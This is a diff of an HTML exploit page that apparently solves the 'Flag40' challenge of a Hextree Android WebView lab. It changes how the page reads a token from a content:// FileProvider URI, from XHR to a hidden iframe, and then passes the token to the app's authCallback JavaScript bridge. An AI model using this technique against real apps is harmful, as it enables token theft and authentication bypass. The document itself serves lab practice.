@@ -1,66 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
     <title>Flag40 Exploit</title>
+    <meta charset="UTF-8">
     <style>
-        body { font-family: sans-serif; padding: 20px; background: #f9f9f9; }
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
         h1 { color: #333; }
-        #status { margin-top: 10px; font-weight: bold; color: #007700; }
+        #status { font-weight: bold; color: #007700; margin: 10px 0; }
+        iframe { display: none; }
     </style>
 </head>
 <body>
-    <h1>Flag40 Exploit</h1>
-    <div id="status">Loading...</div>
+    <h1>Flag40 WebView Exploit</h1>
+    <div id="status">Starting...</div>
 
     <script>
-        const status = document.getElementById('status');
+        // The content:// path of the token file
+        const tokenURI = "content://io.hextree.root/files/token.txt";
 
-        // The content:// URI of the token file exposed by the app's FileProvider
-        const tokenUri = 'content://io.hextree.root/files/token.txt';
-
-        function debug(msg) {
-            console.log(msg);
-            status.innerText = msg;
+        function attemptAuthWithToken(token) {
+            if (window.hextree && window.hextree.authCallback) {
+                try {
+                    window.hextree.authCallback(token.trim());
+                    document.getElementById('status').innerText = "Token sent to authCallback: " + token.substring(0, 10) + "...";
+                    console.log("Auth callback executed with token:", token);
+                } catch(e) {
+                    console.error("Error calling authCallback:", e);
+                    document.getElementById('status').innerText = "Error calling authCallback";
+                }
+            } else {
+                console.log("hextree interface not found");
+                document.getElementById('status').innerText = "hextree interface not available";
+            }
         }
 
-        function readTokenAndAuth(uri) {
-            if (!window.hextree || !window.hextree.authCallback) {
-                debug('hextree interface not available.');
-                return;
-            }
-
-            debug('Attempting to fetch token via content:// URI...');
-
-            // Try XHR to read the content:// URI
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', uri, true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4) {
-                    if (xhr.status === 200 && xhr.responseText) {
-                        const token = xhr.responseText.trim();
-                        debug('Token fetched: ' + token.substring(0, 10) + '...');
-                        try {
-                            window.hextree.authCallback(token);
-                            debug('authCallback executed successfully!');
-                        } catch (e) {
-                            debug('Error calling authCallback: ' + e);
+        function loadTokenViaIframe() {
+            const iframe = document.createElement("iframe");
+            iframe.src = tokenURI;
+            iframe.onload = function() {
+                try {
+                    const doc = iframe.contentDocument || iframe.contentWindow.document;
+                    if (doc) {
+                        const token = doc.body ? doc.body.innerText || doc.body.textContent : "";
+                        if (token) {
+                            attemptAuthWithToken(token);
+                        } else {
+                            document.getElementById('status').innerText = "Token not found in iframe";
                         }
-                    } else {
-                        debug('Failed to read token. Status: ' + xhr.status);
                     }
+                } catch (e) {
+                    console.error("Iframe error:", e);
+                    document.getElementById('status').innerText = "Error reading iframe content";
                 }
             };
-            xhr.onerror = function(e) {
-                debug('XHR error: ' + e);
+            iframe.onerror = function(e) {
+                console.error("Iframe load failed:", e);
+                document.getElementById('status').innerText = "Iframe failed to load token";
             };
-            xhr.send();
+            document.body.appendChild(iframe);
         }
 
-        // Run after the page loads
         window.onload = function() {
-            debug('Page loaded, starting exploit...');
-            setTimeout(() => readTokenAndAuth(tokenUri), 200);
+            document.getElementById('status').innerText = "Loading token from FileProvider...";
+            loadTokenViaIframe();
         };
     </script>
 </body>
